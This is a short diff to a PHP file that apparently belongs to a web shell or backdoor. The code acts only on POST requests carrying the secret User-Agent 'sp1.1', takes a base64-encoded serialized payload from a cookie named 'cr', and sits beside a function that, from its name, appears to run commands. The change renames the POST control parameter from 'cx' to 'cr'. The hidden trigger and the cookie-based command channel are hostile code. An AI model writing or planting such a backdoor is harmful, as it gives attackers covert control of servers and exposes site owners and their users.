@@ -357,13 +357,13 @@ function windows($com, $r)
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
-    if (!empty($_POST["cx"])) {
+    if (!empty($_POST["cr"])) {
         $ns = null;
         $sk = null;
         $ad = null;
         $ct = null;
         $split = null;
-        if ($_POST['cx'] === "1") {
+        if ($_POST['cr'] === "1") {
             $split = unserialize(base64_decode($_COOKIE['cr']), ["allowed_classes" => false]);
         } else {
             $s = $_COOKIE['cr'];
